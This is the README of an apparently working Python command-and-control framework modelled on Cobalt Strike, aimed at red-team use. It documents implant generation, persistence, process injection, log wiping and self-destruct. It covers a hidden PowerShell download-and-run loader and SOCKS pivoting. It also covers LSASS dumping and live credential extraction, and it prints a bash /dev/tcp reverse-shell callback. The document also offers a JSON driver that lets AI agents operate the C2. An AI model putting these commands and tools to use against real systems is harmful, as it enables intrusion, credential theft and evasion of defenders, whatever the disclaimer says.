# cscli — a Cobalt-Strike-style C2 framework (CLI)

A lightweight, **Python stdlib-only** Command & Control framework modeled on the
Cobalt Strike beacon/team-server model. It is a self-contained toolkit intended
for **authorized security testing, red-team exercises, and education**. You are
responsible for using it only against systems you own or have explicit written
permission to test.

## Architecture

```
┌───────────────────────────────┐        HTTP/JSON        ┌──────────────────────────┐
│   cscli operator console      │                          │   cscli beacon (implant) │
│   (interactive CLI)           │                            │                          │
│  ├─ TeamServer (orchestrator) │◄────── checkin/tasks ───►│  polls /checkin          │
│  │   ├─ Listeners (HTTP)      │  results ───────────────►│  executes tasks          │
│  │   └─ SessionStore (persist)│                          │  returns base64 results  │
└───────────────────────────────┘                          └──────────────────────────┘
```

- **Server side** (`cs/server/`): `TeamServer` owns `Listeners` (HTTP/HTTPS beacon
  endpoints) and a persistent `SessionStore`. It is exactly what the CLI console
  talks to.
- **Client side** (`cs/client/beacon.py`): a self-contained beacon that polls a
  listener, pulls queued tasks, executes them on the target, and posts results.
- **Payload generator** (`cs/payload/`): produces a single-file, standalone
  beacon `.py` (command catalog + modules inlined) that runs outside the package.
- **Crypto** (`cs/crypto/`): pure-Python AES-GCM channel encryption + self-signed
  TLS certificate generation for HTTPS listeners.
- **Modules** (`cs/modules/`): persistence, process injection, anti-forensics,
  obfuscation, exploitation-stage helpers, SOCKS5 pivot, and a gated OS-native
  credential-data interface.
- **Compiled binary** (`scripts/build-binary.sh`): PyInstaller builds a standalone
  64-bit/32-bit executable of the beacon. (PyInstaller does not cross-compile;
  run the script on the OS/arch you target.) A PE delivery chain
  (`cs/modules/dropper.py`) produces a `.ps1`/`.bat` loader that fetches + runs
  the compiled beacon on Windows.

## HTTPS listener + AES-GCM channel encryption

Two transport hardening options are supported:

1. **HTTPS**: `https <name> <port> [host]` starts a TLS listener. A self-signed
   RSA certificate is generated automatically (via `openssl`) on first use.
   The beacon connects with `write_payload(..., no_verify=True)` (or
   `--no-verify`) because the cert is self-signed.

2. **AES-GCM body encryption**: set a passphrase in the console with
   `key <passphrase>`, then any listener you start encrypts the JSON protocol
   envelope with AES-GCM. Generate the matching beacon with the same key:
   `write_payload(url, ..., key=KEY)`. Tampering or a wrong key is rejected
   server-side (GCM tag check).

Wire format (envelope): `nonce(12) || ciphertext || tag(16)`, AES-256-GCM,
key derived via PBKDF2-HMAC-SHA256 from the passphrase.

```bash
# console
cscli> key MyS3cret-Passphrase          # enable AES on new listeners
cscli> https tls 443 0.0.0.0            # HTTPS + AES listener
# generate beacon (same key, no-verify for self-signed)
python3 -c "from cs.payload import write_payload;
write_payload('https://YOUR_SERVER:443','b.py', key='MyS3cret-Passphrase', no_verify=True)"
python3 b.py
```

## Capability modules (beacon command set)

The beacon exposes these taskable commands (also usable from the interactive
`use <id>` prompt):

| Command | Description |
|---|---|
| `persist <mech> <path> [name]` | install persistence. mechanisms: `cron`, `shell-profile`, `xdg-autostart`, `systemd` (Linux); `registry`/`win-runkey` (Windows). `persist list` enumerates. |
| `inject <tech> <pid> <ref>` | process injection. `win-dll <pid> <dllpath>` and `win-shellcode <pid> <b64>` (remote-thread injection, Windows only); `linux-ldpreload` (reference). Refuses to run on wrong OS. |
| `wipe <path> [rounds]` | anti-forensics: overwrite a file with zeros then delete it. |
| `flushlogs` | best-effort flush of OS logs (Linux journal/messages/auth; Windows Event logs). |
| `cleanmru <path>` | remove a path from OS recently-used / MRU lists. |
| `selfdestruct <path>` | wipe this beacon file + temp copies, then exit. |

## Reverse shell (bash callback → interactive shell)

Beyond the HTTP/HTTPS beacon, cscli provides a **raw TCP reverse-shell** listener
that receives classic bash call-backs and gives you an interactive shell:

```bash
# interactive console
cscli> reverse-shell 0.0.0.0 4444
cscli> rsh-list
cscli> rsh-shell rsh-1        # interactive shell on the target

# or the non-interactive driver
cscli --reverse-shell --host 0.0.0.0 --port 4444 --callback <PUBLIC_IP> --background
#   -> JSON includes the callback command to run on the target:
#      bash -i >& /dev/tcp/<PUBLIC_IP>/4444 0>&1
cscli --rsh-list
cscli --rsh-shell rsh-1 --command "id"     # one-shot command + output
```

Supported callback variants: `bash`, `nc`, `nc-e`, `mkfifo`, `python`. The
driver daemon holds the live sockets and exposes session state + a command
queue so a stateless CLI can drive them. (Reverse-shell control is inherently
interactive; use `--rsh-shell <sid>` without `--command` for a terminal shell.)

## Compiled binary + PE delivery

PyInstaller turns the beacon into a standalone executable (no Python needed on
the target). PyInstaller does **not** cross-compile, so:
- On this Linux host: `./scripts/build-binary.sh linux64` → `dist/cscli-beacon`
  (a native ELF for this architecture).
- For Windows (64-bit or 32-bit): run the same script on a Windows host with
  Python 3.8+ to get a native `.exe`.

Run the compiled beacon the same way as the script:
```bash
./cscli-beacon https://SERVER:443 --name <id> --key <Key> --no-verify
```

The PE delivery chain (`cs/modules/dropper.py`) produces a `.ps1`/`.bat` loader
that downloads the compiled `.exe` from a listener and executes it hidden — the
typical first-stage for Windows targets. Serve the `.exe` at the listener and
deploy the loader:
```python
from cs.modules.dropper import write_pe_loader
write_pe_loader("https://SERVER:443/beacon.exe", "loader.ps1")
```

## SOCKS5 pivot (reach internal networks through the C2)

Run `socks <port>` on a beacon (e.g. `socks 1080`). It starts a local SOCKS5
server. Point your tools / proxychains / browser at the beacon's address and
the beacon tunnels each connection back through the C2 listener, which dials
the requested internal host and relays the stream. Standard for reaching
internal networks the operator cannot touch directly.

```bash
cscli> use <session>
beacon[<session>]> socks 1080
# on operator machine: proxychains curl --socks5 <beacon_ip>:1080 http://10.x.x.x/
```
`proxychains4 -q -f p.conf <tool>` with `socks5 <beacon_ip> 1080` in `p.conf`.

## Gated OS-native credential interface

The `creds` beacon command (`creds [env|windows|linux|all]`) reports credentials
the operating system exposes to the **calling user** through documented APIs:
Windows Credential Manager (`cmdkey`), the user's environment, and (on Linux)
the session kernel keyring. This is **not** a Mimikatz dump — it does not scrape
LSASS memory or recover account passwords, and it refuses to be useful against
accounts other than the operator's own test host. Use only on systems you are
authorised to test.

## LSASS process memory dump (Windows; admin required)

> ⚠️ **AUTHORIZED SECURITY TESTING ONLY.** This module produces a minidump of
> `lsass.exe` — the same capability mimikatz's `sekurlsa::minidump` provides.
> On non-admin hosts it fails closed with a clear `SeDebugPrivilege` /
> `OpenProcess` error. Don't ship it into any environment where you don't
> have explicit written authorisation.

The `lsass` beacon command (`lsass <out_path> [comsvcs|ctypes]`) dumps LSASS
process memory to a `.dmp` file on the target. Two strategies:

| `prefer=`   | Mechanism                                                    | EDR visibility |
|-------------|--------------------------------------------------------------|----------------|
| `comsvcs` (default) | `rundll32 comsvcs.dll, MiniDump <pid> <out> full` — the OS's own signed binary does the dump; mimikatz's default | Lowest — dbghelp.dll never loads into the beacon |
| `ctypes`    | Direct `MiniDumpWriteDump` via `dbghelp.dll` (after enabling `SeDebugPrivilege`) | Higher — most EDRs flag dbghelp+MiniDumpWriteDump on lsass.exe |

```bash
beacon[<sid>]> lsass C:\Windows\Temp\ls.dmp
beacon[<sid>]> lsass C:\Windows\Temp\ls.dmp ctypes    # explicit strategy
```

The `.dmp` is written on-target. Transfer it off (use `download`, or any
operator-side exfil channel), then parse with **pypykatz** on your host:

```bash
# operator host:
pip install pypykatz
python3 -m pypykatz lsadump lsass.dmp
# or, using the bundled CLI driver:
pip install -e '.[lsass]'
cscli parse-lsass lsass.dmp
```

The `lsass-parse` beacon command (`lsass-parse <dump_path>`) runs the same
pypykatz parse on-target if pypykatz is installed there — usually you want
to offload the parse to the operator host instead.

**What you can recover from the dump**: WDigest cleartext (if WDigest
credssp is enabled — Microsoft disabled this by default since Win8.1 but
many still re-enable it), NTLM hashes, Kerberos TGT/TGS tickets, DPAPI
master keys, current-user Credential Manager entries, and (when LM is
enabled) LM hashes. This is ATT&CK **T1003.001**.

**Restrictions**: requires the beacon to run as **admin** (a member of the
local Administrators group is sufficient — LSASS grants Admins full access
by default). On a non-admin beacon, `dump_lsass` returns `(False,
"failed to enable SeDebugPrivilege (run as admin)")` and writes no file.
The module refuses to run on non-Windows hosts.

The dump module ships with the standard payload, so a generated `beacon.py`
already contains it — see `cs/payload/__init__.py` `_MODULE_FILES`.

## sekurlsa::logonpasswords (live LSASS parsing; Windows; admin)

> ⚠️ **AUTHORIZED SECURITY TESTING ONLY.** This is mimikatz's
> `sekurlsa::logonpasswords` reimplemented in Python on top of pypykatz.
> It reads `lsass.exe` memory **in-process, with no dump file written** —
> the parsed credentials come straight back to the operator. Don't use
> this on any system without explicit written authorisation.

The `sekurlsa` beacon command reads the live `lsass.exe` memory via
pypykatz's `LiveReader` + `apypykatz.start()` and renders the result in
mimikatz-style output:

```bash
beacon[<sid>]> sekurlsa
beacon[<sid>]> sekurlsa --pkgs msv,wdigest,kerberos        # subset only
beacon[<sid>]> sekurlsa --pid 1234                          # explicit PID
beacon[<sid>]> sekurlsa --no-lsa                            # skip LSA step
                                                          # (faster, no cleartext)
```

The output looks like:

```
sekurlsa::logonpasswords
============================================================

Authentication Id : 0;996
Session           : Service
User Name         : svc_sql
Domain            : CONTOSO
Logon Server      : DC01
Logon Time        : 2025-01-15 10:30:45
SID               : S-1-5-...

	msv :
	 [Primary]
	 * Username      : svc_sql
	 * Domain        : CONTOSO
	 * NTLM          : aad3b435b51404eeaad3b435b51404ee
	 * SHA1          : da39a3ee5e6b4b0d3255bfef95601890afd80709

	wdigest :
	 * Username      : svc_sql
	 * Domain        : CONTOSO
	 * Password      : P@ssw0rd!

	kerberos :
	 ...
```

**Supported SSP packages** (all parsed in one run by default): `msv`,
`wdigest`, `kerberos` (with ticket recovery when `--pkgs` includes
`ktickets`), `tspkg`, `ssp`, `livessp`, `dpapi`, `cloudap`.

**Where it can run**:

| Surface                                    | Requires pypykatz? |
|--------------------------------------------|--------------------|
| Standard `cscli --payload` beacon.py       | No — sekurlsa unavailable; falls back to `lsass <path>` dump workflow |
| **PyInstaller-built** `cscli-beacon.exe` (`./scripts/build-binary.sh windows64` on a host with `pip install pypykatz`) | Yes — pypykatz is auto-bundled by PyInstaller |
| Operator host directly (`cscli sekurlsa [--pid <pid>]`) | Yes — operator must have pypykatz installed |

This split is intentional: pypykatz + transitive deps are several MB of
Python and can't be inlined into the stdlib-only single-file payload. The
PyInstaller beacon gets everything bundled.

**Prerequisites on the target**:
- Windows; Python interpreter bitness must match the OS (64-bit Python on
  64-bit Windows — enforced by pypykatz's `LiveReader.sanity_check()`).
- Beacon / operator must be **admin** (member of the local Administrators
  group is sufficient — LSASS grants Admins full access by default).
- LSASS must **not** be running as a Protected Process Light (PPL).
  Win 11 22H2+ with Credential Guard will fail `OpenProcess` with
  `ERROR_ACCESS_DENIED`. Bypass requires either disabling Credential
  Guard (group policy / `HKLM\...\Lsa\RunAsPPL` removal + reboot) or a
  kernel driver to strip the protection. Not implemented in this module.

**`--no-lsa` mode**: skip the LSA template / decryption-key acquisition.
Faster but you lose the LSA session key needed to decrypt WDigest /
Kerberos / TSPKG / SSP / LiveSSP cleartext — only MSV (NT/LM hashes)
survives. Useful when the LSA detector fires but you still want NTLM
hashes for offline cracking.

**This is ATT&CK T1003.001** — OS Credential Dumping: LSASS Memory.

## Obfuscation & exploitation-stage helpers

`cs/modules/obfuscation.py`:
- `obfuscate_payload(src)` — self-decrypting zlib+XOR+base64 payload wrapper.
- `polyglot_loader(url)` / `string_mask`, etc.

`cs/modules/exploitation.py`:
- `make_stager(url)` / `build_beacon_drop(stager, path)` — staged delivery with an
  obfuscated stage-1 that pulls the full beacon.
- `encode_pe_stager(path)` — wrap a compiled binary for staged delivery.
- `protocol_replay(...)` — validate tasking on the C2 protocol without OS touch.

## Protocol

The beacon talks JSON over HTTP POST to the listener:

```
Beacon -> Server   /checkin { beacon_id, meta{...}, results:[{id,data}...] }
Server -> Beacon   { session_id, interval, tasks:[{id,cmd}...], commands:[...] }
```

A check-in both *delivers results* for completed tasks and *pulls new tasks* to
run. Tasks are queued by the operator and marked `queued -> sent -> completed`.

## Commands (beacon-side)

`help` lists them; full set: `shell`, `cd`, `pwd`, `ls`, `cat`, `download`,
`upload <path>;<b64>`, `info`, `whoami`, `sysinfo`, `sleep <sec>`, `exec
<python>`, `exit`.

## Quick start

```bash
# 1. Run the team server console
python3 cscli

# 2. Inside the console, start a listener
cscli> listener main 8080 0.0.0.0

# 3. Generate a beacon payload for the target (in another terminal)
python3 -c "from cs.payload import write_payload;
write_payload('http://YOUR_SERVER:8080', 'beacon.py', interval=3)"

# 4. Deploy and run the beacon on the authorized target:
python3 beacon.py

# 5. Back in the console, see the session and drive it
cscli> sessions
cscli> use <session_id>
beacon[<session_id>]> shell id
beacon[<session_id>]> pwd
beacon[<session_id>]> exit
cscli> results <session_id>
```

## Console commands

| Command | Description |
|---|---|
| `listener <name> <port> [host]` | start an HTTP listener |
| `listener-stop <name>` | stop a listener |
| `listeners` | list running listeners |
| `sessions` | list active beacons (marks STALE if not seen recently) |
| `use <id>` / `interactive` | enter interactive mode to task a beacon |
| `results <id>` | show collected results for a session |
| `clear-results <id>` | drop saved results |
| `sleep <sec>` | default beacon callback interval |
| `help` / `quit` | help / exit |

## Non-interactive CLI (AI / script driver)

`cscli` also runs as a single-shot, JSON-out driver for agents and build
pipelines — everything you can do from the interactive prompt you can drive in
one command. Invocations are separate processes that share state through the
data dir (`CSCLI_DATA_DIR`, default `<repo>/data`); the listener is owned by a
detached background daemon.

```bash
# start a listener (foreground/holding, or --background to detach a daemon)
cscli --server --https --host 0.0.0.0 --port 443 --name main \
      --key MyS3cret-Passphrase --background
#   -> {"ok":true,"daemon_pid":...,"listener":"https://0.0.0.0:443",...}

# generate a client payload
cscli --payload --url https://h:443 --out beacon.py --key MyS3cret-Passphrase --no-verify

# list sessions / task with wait / dump results (all JSON on stdout)
cscli --list
cscli --task <session_id> "shell id" --wait --timeout 40
cscli --results <session_id>
```

The same is available programmatically:
```python
from cs.server import TeamServer
from cs.payload import write_payload
srv = TeamServer(data_dir="data")
lis, err = srv.start_https_listener("main","0.0.0.0",443, crypto_key=KEY)
write_payload(f"https://h:443","beacon.py", key=KEY, no_verify=True)
# ...
srv.task(session_id, "shell id")
```

## Resilience & session lifecycle

**Reconnect:** the beacon never gives up on a down/restarting server. If the
listener is unreachable (including on its very first check-in), it logs
`tick error` and retries on every callback interval until the server is back.
Because the beacon id is stable, reconnecting to a restarted team server
re-attaches to the same session (last_seen refreshes).

**Server-ordered disconnect:** task a beacon with `disconnect`. The beacon sends
a goodbye, calls `/disconnect` (server drops its session record) and stops.

```bash
# non-interactive
cscli --disconnect <session_id>
# interactive
cscli> disconnect <session_id>
```

**Delete a session record** (remove from the store; a live session needs
`--force` or a prior `disconnect`):

```bash
cscli --delete <session_id> [--force]        # non-interactive
cscli> delete <session_id> [--force]         # interactive
```

## Persistence

Session, task, and result state is JSON-persisted under `data/sessions.json`
(customize the dir with the `CSCLI_DATA_DIR` env var). Restarting the console
restores prior sessions.

## Testing

The repo ships self-tests (no live C2 traffic between hosts, all localhost):

```bash
python3 test_e2e.py      # API-level: store + listener + in-process roundtrip
python3 test_live.py     # real beacon subprocess + tasking from a driver
python3 test_operator.py # full operator console drives a live beacon end-to-end
python3 test_tls.py      # HTTPS + AES-GCM encrypted channel + module tasking
python3 test_socks.py    # SOCKS5 pivot tunnels to an internal network
python3 test_compiled.py # PyInstaller-compiled beacon executable end-to-end
python3 test_cli_driver.py # non-interactive CLI driver (server/payload/list/task/wait)
python3 test_rsh.py        # raw TCP reverse shell (real bash callback) in-process
python3 test_rsh_cli.py    # reverse shell via the non-interactive CLI driver
python3 test_resilience.py # reconnect on outage + disconnect/delete
python3 test_lsass.py      # LSASS-dump module unit tests (non-Windows refusal,
                           #   parse_dump error paths, sekurlsa output format)
```

## Layout

```
cs/
  __init__.py
  commands.py            # shared command catalog + validation
  crypto/                # pure-Python AES + GCM cipher; TLS cert generation
    aes.py  __init__.py  certs.py
  server/                # TeamServer, HTTP(S) listener, session store, SOCKS relay
  client/beacon.py       # self-contained beacon / implant
  payload/               # standalone payload generation (inlines all deps)
  modules/               # persistence, injection, antiforensics, obfuscation,
                         #   socks (SOCKS5 pivot), credentials, dropper (PE chain),
                         #   exploitation, lsass (LSASS minidump + sekurlsa live parse;
                         #     both authorized-testing-only)
  cli/console.py         # interactive operator CLI
build/beacon_entry.py    # PyInstaller entrypoint
scripts/build-binary.sh  # builds the standalone beacon executable
test_*.py                # self-tests (see Testing)
```

## Disclaimer

This software is provided for authorized security testing and education. Do not
use it against any system without explicit permission. Running implants on
unauthorized systems is illegal and unethical.
